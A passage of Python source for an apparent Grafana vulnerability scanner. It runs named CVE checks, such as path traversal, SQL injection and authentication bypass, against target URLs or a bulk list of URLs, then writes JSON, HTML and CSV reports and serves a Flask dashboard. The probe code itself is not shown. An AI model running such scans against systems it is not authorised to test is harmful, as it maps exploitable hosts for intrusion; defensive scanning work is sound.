        if self.vulndb:
            self.vulndb.add_target(url, version=version)
        
        # Phase 3: Vulnerability Assessment
        print()
        self.log("Phase 3: Vulnerability Scanning", "INFO")
        print()
        
        cve_checks = [
            ("CVE-2025-4123", "CRITICAL", "Path Traversal & Open Redirect", self.check_cve_2025_4123),
            ("CVE-2024-9264", "CRITICAL", "DuckDB SQL Injection (RCE)", self.check_cve_2024_9264),
            ("CVE-2024-8118", "CRITICAL", "OAuth Authentication Bypass", self.check_cve_2024_8118),
            ("CVE-2021-43798", "CRITICAL", "Directory Traversal", self.check_cve_2021_43798),
            ("CVE-2023-50164", "HIGH", "Plugin Path Traversal", self.check_cve_2023_50164),
            ("CVE-2023-1410", "HIGH", "SSRF via Data Source Proxy", self.check_cve_2023_1410),
            ("CVE-2023-2183", "HIGH", "Authentication Bypass", self.check_cve_2023_2183),
            ("CVE-2018-15727", "HIGH", "Authentication Bypass (Cookie)", self.check_cve_2018_15727),
            ("CVE-2021-39226", "MEDIUM", "Snapshot Enumeration", self.check_cve_2021_39226),
            ("CVE-2024-1313", "MEDIUM", "Information Disclosure", self.check_cve_2024_1313),
        ]
        
        if self.max_threads > 1 and len(cve_checks) > 1:
            self._run_cve_checks_parallel(cve_checks, url, results)
        else:
            for cve_id, severity, description, check_func in cve_checks:
                self._run_single_cve_check(cve_id, severity, description, check_func, url, results)
        
        for vulnerable, message, test_url, cve_id in self.check_additional_cves(url):
            if vulnerable:
                severity = "MEDIUM" if "2020" in cve_id or "2021" in cve_id else "LOW"
                self._report_vulnerability(cve_id, severity, message, test_url, results)
            elif self.verbose:
                self.log(f"{cve_id:18} {message}", "SAFE", 1)
        
        # Phase 4: Configuration Analysis
        print()
        self.log("Phase 4: Security Configuration Analysis", "INFO")
        config = self.check_security_config(url)
        results['configuration'] = config
        
        for check_name, check_data in config.items():
            severity = check_data.get('severity', 'INFO')
            if severity in ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']:
                self.log(check_data.get('message', str(check_data)), severity, 1)
                if 'url' in check_data:
                    self.log(f"└─ Endpoint: {Colors.DIM}{check_data['url']}{Colors.RESET}", severity, 2)
        
        # Save results to database
        if self.vulndb:
            for vuln in results['vulnerabilities']:
                self.vulndb.add_vulnerability({
                    **vuln,
                    'target_url': url,
                    'target_version': version
                })
            self.vulndb.add_scan_history(results)
        
        # Final Statistics
        results['statistics'] = self.stats
        results['duration'] = time.time() - start_time
        
        print()
        self.log("Scan Statistics:", "INFO")
        self.log(f"Total checks: {self.stats['total_checks']}", "INFO", 1)
        self.log(f"Vulnerabilities: {self.stats['vulnerabilities_found']}", 
                 "CRITICAL" if self.stats['vulnerabilities_found'] > 0 else "SUCCESS", 1)
        self.log(f"Checks passed: {self.stats['checks_passed']}", "SUCCESS", 1)
        if self.stats['errors'] > 0:
            self.log(f"Errors: {self.stats['errors']}", "WARN", 1)
        self.log(f"Duration: {results['duration']:.1f}s", "INFO", 1)
        
        return results
    
    def _run_cve_checks_parallel(self, cve_checks: List[Tuple], url: str, results: Dict):
        """Run CVE checks in parallel using thread pool"""
        def run_check(check_info):
            cve_id, severity, description, check_func = check_info
            try:
                vulnerable, message, test_url = check_func(url)
                return cve_id, severity, description, vulnerable, message, test_url
            except Exception as e:
                return cve_id, severity, description, False, f"Error: {str(e)}", url
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(run_check, check): check for check in cve_checks}
            for future in concurrent.futures.as_completed(futures):
                cve_id, severity, description, vulnerable, message, test_url = future.result()
                if vulnerable:
                    self._report_vulnerability(cve_id, severity, message, test_url, results, description)
                elif self.verbose:
                    self.log(f"{cve_id:18} {message}", "SAFE", 1)
    
    def _run_single_cve_check(self, cve_id: str, severity: str, description: str,
                              check_func, url: str, results: Dict):
        """Run a single CVE check"""
        try:
            vulnerable, message, test_url = check_func(url)
            if vulnerable:
                self._report_vulnerability(cve_id, severity, message, test_url, results, description)
            elif self.verbose:
                self.log(f"{cve_id:18} {message}", "SAFE", 1)
        except Exception as e:
            if self.verbose:
                self.log(f"{cve_id:18} Error: {str(e)}", "ERROR", 1)
    
    def _report_vulnerability(self, cve_id: str, severity: str, message: str, 
                              test_url: str, results: Dict, description: Optional[str] = None):
        """Report a vulnerability finding"""
        color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 
                 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}.get(severity, Colors.INFO)
        
        description_str = f" {description}" if description else ""
        self.log(f"{cve_id:18}{description_str}", severity, 1)
        self.log(f"└─ {message}", severity, 2)
        self.log(f"└─ Test URL: {Colors.DIM}{test_url}{Colors.RESET}", severity, 2)
        print()
        
        results['vulnerabilities'].append({
            'cve_id': cve_id,
            'severity': severity,
            'description': description or message,
            'message': message,
            'test_url': test_url
        })
    
    def scan_from_file(self, filename: str) -> List[Dict]:
        """Scan multiple targets from file"""
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            self.log(f"Loaded {len(urls)} targets from {filename}", "INFO")
            
            results = []
            for i, url in enumerate(urls, 1):
                print(f"\n{Colors.BOLD}[Target {i}/{len(urls)}]{Colors.RESET}")
                result = self.scan_target(url)
                results.append(result)
                
                if i < len(urls) and not self._rate_limited:
                    time.sleep(1)
            
            return results
            
        except FileNotFoundError:
            self.log(f"File not found: {filename}", "ERROR")
            sys.exit(1)
        except Exception as e:
            self.log(f"Error reading file: {str(e)}", "ERROR")
            sys.exit(1)
    
    # =================================================================
    #  REPORT GENERATION
    # =================================================================
    
    def generate_report(self, results: List[Dict], output_file: Optional[str] = None):
        """Generate comprehensive assessment report"""
        print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
        print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}ASSESSMENT SUMMARY{Colors.RESET}")
        print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
        
        total_targets = len(results)
        vulnerable_targets = sum(1 for r in results if r['vulnerabilities'])
        accessible_targets = sum(1 for r in results if r.get('accessible'))
        
        severity_counts = defaultdict(int)
        for result in results:
            for vuln in result['vulnerabilities']:
                severity_counts[vuln['severity']] += 1
        
        print(f"Targets Scanned:      {Colors.BOLD}{total_targets}{Colors.RESET}")
        print(f"Targets Reachable:    {Colors.SUCCESS if accessible_targets == total_targets else Colors.WARN}{Colors.BOLD}{accessible_targets}{Colors.RESET}")
        print(f"Vulnerable Targets:   {Colors.CRITICAL if vulnerable_targets > 0 else Colors.SUCCESS}{Colors.BOLD}{vulnerable_targets}{Colors.RESET}")
        print(f"Secure Targets:       {Colors.SUCCESS}{Colors.BOLD}{total_targets - vulnerable_targets}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}Vulnerability Distribution:{Colors.RESET}")
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = severity_counts.get(severity, 0)
            if count > 0:
                color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}[severity]
                symbol = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵'}[severity]
                print(f"  {symbol} {color}{severity:10} {count:3}{Colors.RESET}")
            else:
                print(f"  ✓ {Colors.DIM}{severity:10}   0{Colors.RESET}")
        
        if vulnerable_targets > 0:
            print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}DETAILED FINDINGS{Colors.RESET}")
            print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
            
            for result in results:
                if result['vulnerabilities']:
                    print(f"{Colors.VULN}▶{Colors.RESET} {Colors.BOLD}{result['url']}{Colors.RESET}")
                    if result['version']:
                        print(f"  {Colors.DIM}Version: Grafana v{result['version']}{Colors.RESET}")
                    
                    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                        vulns = [v for v in result['vulnerabilities'] if v['severity'] == severity]
                        if vulns:
                            for vuln in vulns:
                                color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}[severity]
                                symbol = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵'}[severity]
                                print(f"\n  {symbol} {color}[{severity}] {vuln['cve_id']}{Colors.RESET}")
                                print(f"     └─ {vuln['message']}")
                                print(f"     └─ {Colors.DIM}{vuln['test_url']}{Colors.RESET}")
                    print()
        else:
            print(f"\n{Colors.SUCCESS}✓ All scanned targets appear secure{Colors.RESET}")
        
        if output_file:
            base_filename = output_file
            for ext in ['.json', '.html', '.csv']:
                if base_filename.endswith(ext):
                    base_filename = base_filename[:-len(ext)]
                    break
            
            self._save_json_report(results, f"{base_filename}.json")
            self._save_html_report(results, f"{base_filename}.html")
            self._save_csv_report(results, f"{base_filename}.csv")
    
    def _save_json_report(self, results: List[Dict], filename: str):
        """Save JSON format report"""
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            print(f"\n{Colors.SUCCESS}[+] JSON report saved: {filename}{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.CRITICAL}[-] Error saving JSON report: {str(e)}{Colors.RESET}")
    
    def _save_html_report(self, results: List[Dict], filename: str):
        """Save HTML format report"""
        try:
            total_vulns = sum(len(r['vulnerabilities']) for r in results)
            total_targets = len(results)
            vulnerable_targets = sum(1 for r in results if r['vulnerabilities'])
            
            vuln_rows = ""
            for result in results:
                if result['vulnerabilities']:
                    for vuln in result['vulnerabilities']:
                        severity_color = {
                            'CRITICAL': '#dc3545',
                            'HIGH': '#fd7e14',
                            'MEDIUM': '#ffc107',
                            'LOW': '#0dcaf0'
                        }.get(vuln['severity'], '#6c757d')
                        
                        esc_url = html.escape(result['url'])
                        esc_version = html.escape(result.get('version', 'Unknown') or 'Unknown')
                        esc_severity = html.escape(vuln['severity'])
                        esc_cve = html.escape(vuln['cve_id'])
                        esc_msg = html.escape(vuln['message'][:80])
                        esc_test_url = html.escape(vuln.get('test_url', '#'))
                        
                        vuln_rows += f"""
                        <tr>
                            <td><a href="{esc_url}" target="_blank">{esc_url[:60]}...</a></td>
                            <td>{esc_version}</td>
                            <td><span class="badge" style="background-color: {severity_color}">{esc_severity}</span></td>
                            <td><code>{esc_cve}</code></td>
                            <td>{esc_msg}</td>
                            <td><small><a href="{esc_test_url}" target="_blank">Link</a></small></td>
                        </tr>"""
            
            if not vuln_rows:
                vuln_rows_html = '<tr><td colspan="6" style="text-align: center; padding: 30px; color: #888;">No vulnerabilities detected</td></tr>'
            else:
                vuln_rows_html = vuln_rows
            
            html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grafana Security Scan Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f1a; color: #e0e0e0; padding: 20px; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        .header {{ background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 30px; border-radius: 10px; margin-bottom: 30px; border: 1px solid #2a2a4a; }}
        .header h1 {{ color: #ff4444; font-size: 28px; }}
        .header p {{ color: #888; margin-top: 10px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }}
        .stat-card {{ background: #1a1a2e; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #2a2a4a; }}
        .stat-card h3 {{ font-size: 14px; color: #888; margin-bottom: 10px; }}
        .stat-card .value {{ font-size: 32px; font-weight: bold; }}
        .stat-card .critical {{ color: #dc3545; }}
        .stat-card .safe {{ color: #28a745; }}
        table {{ width: 100%; border-collapse: collapse; background: #1a1a2e; border-radius: 8px; overflow: hidden; border: 1px solid #2a2a4a; }}
        th, td {{ padding: 12px 15px; text-align: left; border-bottom: 1px solid #2a2a4a; }}
        th {{ background: #16213e; color: #888; font-size: 12px; text-transform: uppercase; }}
        tr:hover {{ background: #1f1f35; }}
        a {{ color: #0dcaf0; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        .badge {{ display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; color: #000; }}
        code {{ background: #2a2a4a; padding: 2px 6px; border-radius: 4px; font-size: 12px; }}
        .footer {{ text-align: center; margin-top: 30px; color: #555; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Grafana Security Scan Report</h1>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Targets: {total_targets}</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Targets Scanned</h3>
                <div class="value safe">{total_targets}</div>
            </div>
            <div class="stat-card">
                <h3>Vulnerable</h3>
                <div class="value critical">{vulnerable_targets}</div>
            </div>
            <div class="stat-card">
                <h3>Secure</h3>
                <div class="value safe">{total_targets - vulnerable_targets}</div>
            </div>
            <div class="stat-card">
                <h3>Total Vulnerabilities</h3>
                <div class="value critical">{total_vulns}</div>
            </div>
        </div>
        
        <h2 style="margin-bottom: 15px;">Vulnerability Details</h2>
        <table>
            <thead>
                <tr>
                    <th>Target</th>
                    <th>Version</th>
                    <th>Severity</th>
                    <th>CVE ID</th>
                    <th>Description</th>
                    <th>Test URL</th>
                </tr>
            </thead>
            <tbody>
                {vuln_rows_html}
            </tbody>
        </table>
        
        <div class="footer">
            <p>Generated by Grafana Final Scanner | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
    </div>
</body>
</html>"""
            
            with open(filename, 'w') as f:
                f.write(html_content)
            print(f"{Colors.SUCCESS}[+] HTML report saved: {filename}{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.CRITICAL}[-] Error saving HTML report: {str(e)}{Colors.RESET}")
    
    def _save_csv_report(self, results: List[Dict], filename: str):
        """Save CSV format report"""
        try:
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Target URL', 'Grafana Version', 'CVE ID', 'Severity', 'Description', 'Message', 'Test URL', 'Timestamp'])
                
                for result in results:
                    if result['vulnerabilities']:
                        for vuln in result['vulnerabilities']:
                            writer.writerow([
                                result['url'],
                                result.get('version', 'Unknown'),
                                vuln['cve_id'],
                                vuln['severity'],
                                vuln.get('description', ''),
                                vuln['message'],
                                vuln.get('test_url', ''),
                                result.get('timestamp', '')
                            ])
                    else:
                        writer.writerow([
                            result['url'],
                            result.get('version', 'Unknown'),
                            'N/A', 'N/A', 'No vulnerabilities found', '', '',
                            result.get('timestamp', '')
                        ])
            
            print(f"{Colors.SUCCESS}[+] CSV report saved: {filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.CRITICAL}[-] Error saving CSV report: {str(e)}{Colors.RESET}")


# =====================================================================
#  WEB SERVER
# =====================================================================

def create_web_server(scanner: GrafanaFinalScanner, host: str = '127.0.0.1', port: int = 8080):
    """
    Create and configure Flask web server for viewing scan results
    and managing targets/vulnerabilities.
    
    Args:
        scanner: Scanner instance with vulnerability database
        host: Host to bind to
        port: Port to listen on
    
    Returns:
        Configured Flask app
    """
    if not FLASK_AVAILABLE:
        print(f"{Colors.CRITICAL}[!] Flask is not installed. Install with: pip install flask{Colors.RESET}")
        sys.exit(1)
    
    app = Flask(__name__)
    
    @app.route('/')
    def dashboard():
        """Main dashboard with statistics and overview"""
        stats = scanner.vulndb.get_statistics() if scanner.vulndb else {}
        targets = scanner.vulndb.get_all_targets() if scanner.vulndb else []
        vulns = scanner.vulndb.get_open_vulnerabilities() if scanner.vulndb else []
        
        return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
            <title>🛡️ Grafana Scanner - Dashboard</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
        
                body {
                    background: radial-gradient(circle at 10% 20%, #0c0c18, #070710);
                    font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, 'SF Pro Text', 'Roboto', sans-serif;
                    color: #eef2ff;
                    line-height: 1.5;
                    padding-bottom: 2rem;
                }
        
                ::-webkit-scrollbar {
                    width: 8px;
                    height: 8px;
                }
                ::-webkit-scrollbar-track {
                    background: #1e1e2c;
                    border-radius: 10px;
                }
                ::-webkit-scrollbar-thumb {
                    background: #4a4a6a;
                    border-radius: 10px;
                }
                ::-webkit-scrollbar-thumb:hover {
                    background: #6c6c96;
                }
        
                .navbar {
                    background: rgba(18, 18, 30, 0.85);
                    backdrop-filter: blur(10px);
                    padding: 0.9rem 2rem;
                    display: flex;
                    flex-wrap: wrap;
                    align-items: center;
                    gap: 1.2rem;
                    border-bottom: 1px solid rgba(88, 88, 140, 0.3);
                    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
                }
                .navbar h1 {
                    font-size: 1.65rem;
                    font-weight: 700;
                    background: linear-gradient(130deg, #ff7b7b, #ff3a3a);
                    background-clip: text;
                    -webkit-background-clip: text;
                    color: transparent;
                    letter-spacing: -0.3px;
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }
                .navbar .nav-links {
                    display: flex;
                    gap: 0.3rem;
                    flex-wrap: wrap;
                }
                .navbar a {
                    color: #b9c3e6;
                    text-decoration: none;
                    padding: 8px 16px;
                    border-radius: 40px;
                    font-weight: 500;
                    transition: all 0.2s ease;
                    font-size: 0.9rem;
                    display: inline-flex;
                    align-items: center;
                    gap: 6px;
                }
                .navbar a:hover, .navbar a.active {
                    background: #2e2a4a;
                    color: #ffffff;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
                }
                .navbar a.active {
                    background: #3c2e5e;
                    border: 1px solid #a970ff50;
                }
        
                .container {
                    max-width: 1400px;
                    margin: 1.8rem auto 0 auto;
                    padding: 0 1.8rem;
                }
        
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
                    gap: 1.5rem;
                    margin-bottom: 2.5rem;
                }
                .stat-card {
                    background: rgba(22, 22, 38, 0.75);
                    backdrop-filter: blur(4px);
                    border-radius: 28px;
                    padding: 1.3rem 1rem;
                    text-align: center;
                    border: 1px solid rgba(100, 100, 150, 0.25);
                    box-shadow: 0 10px 20px -8px rgba(0,0,0,0.4);
                    transition: transform 0.2s ease, border-color 0.2s;
                }
                .stat-card:hover {
                    transform: translateY(-3px);
                    border-color: #ff6b6b70;
                    background: rgba(28, 28, 48, 0.85);
                }
                .stat-card h3 {
                    font-size: 0.9rem;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                    font-weight: 500;
                    color: #b4c0ff;
                    margin-bottom: 12px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 8px;
                }
                .stat-card .value {
                    font-size: 2.6rem;
                    font-weight: 800;
                    line-height: 1.1;
                }
                .card-danger { color: #ff6e7f; text-shadow: 0 0 6px rgba(255,60,60,0.3); }
                .card-warning { color: #f9b43a; text-shadow: 0 0 4px #f9b43a40; }
                .card-safe { color: #6cd97b; text-shadow: 0 0 5px #2ea84630; }
                .card-info { color: #6fcbff; text-shadow: 0 0 5px #3c9eff30; }
        
                .section-title {
                    font-size: 1.6rem;
                    font-weight: 600;
                    margin: 2rem 0 1rem 0;
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    border-left: 5px solid #ff6a5c;
                    padding-left: 1rem;
                }
                .subhead {
                    color: #9ba7df;
                    margin: -0.8rem 0 1.5rem 0;
                    font-size: 0.9rem;
                }
        
                .table-wrapper {
                    overflow-x: auto;
                    border-radius: 20px;
                    background: #11121e;
                    border: 1px solid #2a2b40;
                    margin-bottom: 2rem;
                    box-shadow: 0 6px 14px rgba(0,0,0,0.3);
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    font-size: 0.9rem;
                }
                th {
                    text-align: left;
                    padding: 14px 16px;
                    background: #16172b;
                    color: #cdd6ff;
                    font-weight: 600;
                    font-size: 0.8rem;
                    letter-spacing: 0.5px;
                    text-transform: uppercase;
                    border-bottom: 1px solid #2f314e;
                }
                td {
                    padding: 12px 16px;
                    border-bottom: 1px solid #23243e;
                    vertical-align: middle;
                }
                tr:last-child td {
                    border-bottom: none;
                }
                tr:hover td {
                    background: #1c1d36;
                    transition: 0.1s;
                }
        
                .badge {
                    display: inline-flex;
                    align-items: center;
                    gap: 6px;
                    padding: 4px 12px;
                    border-radius: 40px;
                    font-size: 0.7rem;
                    font-weight: 700;
                    text-transform: uppercase;
                    letter-spacing: 0.4px;
                    background: #1e1f38;
                    color: white;
                }
                .severity-critical { background: #bc2f3e; box-shadow: 0 0 6px #ff4d6d; }
                .severity-high { background: #e67e22; }
                .severity-medium { background: #e9b741; color: #1f1f2a; }
                .severity-low { background: #3c91e6; }
        
                .status-badge {
                    display: inline-flex;
                    align-items: center;
                    gap: 6px;
                }
                .status-open { color: #ff7676; font-weight: 600; }
                .status-fixed { color: #6fcf97; }
                
                .actions {
                    display: flex;
                    gap: 8px;
                    flex-wrap: wrap;
                }
                .btn {
                    padding: 6px 12px;
                    border: none;
                    border-radius: 40px;
                    font-size: 0.7rem;
                    font-weight: 600;
                    cursor: pointer;
                    transition: 0.15s;
                    display: inline-flex;
                    align-items: center;
                    gap: 6px;
                    background: #2a2c48;
                    color: #f0f3ff;
                }
                .btn-fix {
                    background: #2b7a3e;
                    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
                }
                .btn-fix:hover { background: #3e9a57; transform: scale(0.96); }
                .btn-fp {
                    background: #b9772e;
                }
                .btn-fp:hover { background: #da9246; transform: scale(0.96); }
        
                .risk-meta {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                .risk-bar {
                    flex: 1;
                    height: 8px;
                    background: #292b48;
                    border-radius: 20px;
                    overflow: hidden;
                }
                .risk-fill {
                    height: 100%;
                    border-radius: 20px;
                    transition: width 0.2s ease;
                }
                .risk-high { background: linear-gradient(90deg, #ff5e6e, #ff2e4a); }
                .risk-medium { background: linear-gradient(90deg, #fd9e4a, #ffbc6e); }
                .risk-low { background: linear-gradient(90deg, #50cc8a, #8effbc); }
        
                .empty-state {
                    text-align: center;
                    padding: 3rem 1.5rem;
                    background: #10111e;
                    border-radius: 32px;
                    margin: 1rem 0;
                    border: 1px dashed #4a4d74;
                }
                .empty-state h3 {
                    font-size: 1.4rem;
                    margin-bottom: 8px;
                }
                .empty-state p {
                    color: #96a0d0;
                }
        
                .dist-row {
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    gap: 12px;
                    flex-wrap: wrap;
                }
                .dist-bar-container {
                    flex: 2;
                    height: 12px;
                    background: #252741;
                    border-radius: 40px;
                    overflow: hidden;
                }
                .dist-bar-fill {
                    height: 100%;
                    width: 0%;
                    border-radius: 40px;
                }
        
                .timestamp {
                    text-align: right;
                    margin-top: 2rem;
                    font-size: 0.7rem;
                    color: #6b6f9e;
                    border-top: 1px solid #2d2f50;
                    padding-top: 1rem;
                }
        
                .insight-message {
                    background: #1d1e30;
                    border-radius: 28px;
                    padding: 0.8rem 1.5rem;
                    margin-bottom: 2rem;
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    border-left: 6px solid #ff9f4a;
                    font-size: 0.9rem;
                }
                .footnote {
                    text-align: center;
                    font-size: 0.7rem;
                    margin-top: 2rem;
                    color: #5b5e8a;
                }
                a {
                    color: #8eaeff;
                    text-decoration: none;
                }
                a:hover {
                    text-decoration: underline;
                    color: #b7ceff;
                }
                code {
                    background: #00000040;
                    padding: 2px 8px;
                    border-radius: 30px;
                    font-size: 0.8rem;
                }
                @media (max-width: 700px) {
                    .container { padding: 0 1rem; }
                    .stat-card .value { font-size: 2rem; }
                    .navbar h1 { font-size: 1.3rem; }
                }
            </style>
        </head>
        <body>
        
        <div class="navbar">
            <h1>
                <span>🛡️</span> Grafana Scanner
            </h1>
            <div class="nav-links">
                <a href="/" class="active">📊 Dashboard</a>
                <a href="/targets">🎯 Targets</a>
                <a href="/vulnerabilities">⚠️ Vulns DB</a>
            </div>
            <div style="margin-left: auto; font-size: 0.8rem; opacity: 0.7;">👋 hey, security hero</div>
        </div>
        
        <div class="container">
            {% set open_vulns = stats.get('open_vulnerabilities', 0) %}
            <div class="insight-message">
                <span>🧠</span>
                {% if open_vulns == 0 %}
                    ✨ All clear! No open vulnerabilities — you're a legend. Keep scanning!
                {% elif open_vulns < 3 %}
                    🧹 A few issues found – good time to patch them before they grow.
                {% else %}
                    🚨 Heads up! {{ open_vulns }} unresolved vulnerabilities need attention.
                {% endif %}
            </div>
        
            <div class="stats-grid">
                <div class="stat-card">
                    <h3>📡 TRACKED TARGETS</h3>
                    <div class="value card-info">{{ stats.get('total_targets', 0) }}</div>
                    <div style="font-size: 12px; margin-top: 8px;">🌐 monitored assets</div>
                </div>
                <div class="stat-card">
                    <h3>⚠️ OPEN VULNS</h3>
                    <div class="value card-danger">{{ stats.get('open_vulnerabilities', 0) }}</div>
                    <div style="font-size: 12px;">🔓 need fixing asap</div>
                </div>
                <div class="stat-card">
                    <h3>🔄 SCANS PERFORMED</h3>
                    <div class="value card-safe">{{ stats.get('total_scans', 0) }}</div>
                    <div style="font-size: 12px;">🛠️ total health checks</div>
                </div>
                <div class="stat-card">
                    <h3>🎯 TARGETS AT RISK</h3>
                    <div class="value card-warning">{{ stats.get('targets_at_risk', 0) }}</div>
                    <div style="font-size: 12px;">🔥 high risk exposure</div>
                </div>
            </div>
        
            <div class="section-title">
                <span>🚨💀</span> Critical vulnerabilities
                <span style="font-size: 0.8rem; background: #2a1c2e; padding: 2px 12px; border-radius: 30px;">{{ stats.get('by_severity', {}).get('CRITICAL', 0) }} active</span>
            </div>
            <div class="subhead">🔔 These can lead to full compromise — patch immediately!</div>
            
            {% set critical_list = [] %}
            {% for v in vulns if v.get('severity') == 'CRITICAL' %}
                {% set _ = critical_list.append(v) %}
            {% endfor %}
            
            {% if critical_list %}
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>🎯 Target</th><th>🔖 CVE ID</th><th>💥 Severity</th><th>📝 Issue snippet</th><th>🔧 Actions</th></tr>
                    </thead>
                    <tbody>
                        {% for v in vulns if v.get('severity') == 'CRITICAL' %}
                        <tr>
                            <td><a href="/targets?url={{ v.get('target_url', '') | urlencode }}">🌐 {{ v.get('target_url', '')[:45] }}{% if v.get('target_url', '')|length > 45 %}..{% endif %}</a></td>
                            <td><code>{{ v.get('cve_id', 'N/A') }}</code></td>
                            <td><span class="badge severity-critical">🔥 CRITICAL</span></td>
                            <td style="max-width: 280px;">{{ v.get('message', '')[:65] }}{% if v.get('message', '')|length > 65 %}…{% endif %}</td>
                            <td class="actions">
                                <button class="btn btn-fix" onclick="updateStatus('{{ v.get('id', '') }}', 'fixed')">✅ Mark Fixed</button>
                                <button class="btn btn-fp" onclick="updateStatus('{{ v.get('id', '') }}', 'false_positive')">❌ False Positive</button>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            {% else %}
            <div class="empty-state">
                <h3>🎉🌈 No critical vulnerabilities!</h3>
                <p>Your most dangerous paths are secure — but keep an eye on high/medium issues.</p>
            </div>
            {% endif %}
        
            <div class="section-title">
                <span>📊🧩</span> Vulnerability breakdown
                <span style="font-size: 0.75rem;">severity × count</span>
            </div>
            {% set severities = {'CRITICAL': '🔴 Critical', 'HIGH': '🟠 High', 'MEDIUM': '🟡 Medium', 'LOW': '🔵 Low'} %}
            {% set severity_colors = {'CRITICAL': '#e34d5e', 'HIGH': '#f39c12', 'MEDIUM': '#f4d03f', 'LOW': '#5dade2'} %}
            {% set total_vulns = stats.get('by_severity', {}).get('CRITICAL', 0) + stats.get('by_severity', {}).get('HIGH', 0) + stats.get('by_severity', {}).get('MEDIUM', 0) + stats.get('by_severity', {}).get('LOW', 0) %}
            
            <div style="background: #131424; border-radius: 28px; padding: 1.2rem 1.5rem; margin-bottom: 2rem; border: 1px solid #2e2f50;">
                {% for sev_key, sev_name in severities.items() %}
                {% set count = stats.get('by_severity', {}).get(sev_key, 0) %}
                {% set bar_width = (count / total_vulns * 100) if total_vulns > 0 else 0 %}
                <div style="margin-bottom: 1rem;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                        <span style="font-weight: 500;">{{ sev_name }} <span style="font-size:0.75rem;">({{ count }})</span></span>
                        <span>{{ "%.0f"|format(bar_width) }}%</span>
                    </div>
                    <div class="dist-bar-container">
                        <div class="dist-bar-fill" style="width: {{ bar_width }}%; background: {{ severity_colors[sev_key] }}; box-shadow: 0 0 4px {{ severity_colors[sev_key] }};"></div>
                    </div>
                </div>
                {% endfor %}
                <div style="margin-top: 12px; font-size: 0.7rem; text-align: center; color: #acaee6;">📌 total findings: {{ total_vulns }}</div>
            </div>
        
            <div class="section-title">
                <span>🎯📡</span> Recent targets & risk profile
                <span style="font-size:0.7rem;">🔍 last monitored assets</span>
            </div>
            {% if targets %}
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>🌍 Target URL</th><th>📦 Grafana ver</th><th>🔁 Scans</th><th>⚠️ Open Vulns</th><th>📈 Risk score</th></tr>
                    </thead>
                    <tbody>
                        {% for t in targets[:10] %}
                        <tr>
                            <td><a href="/targets?url={{ t.get('url', '') | urlencode }}">🗺️ {{ t.get('url', '')[:55] }}{% if t.get('url', '')|length > 55 %}..{% endif %}</a></td>
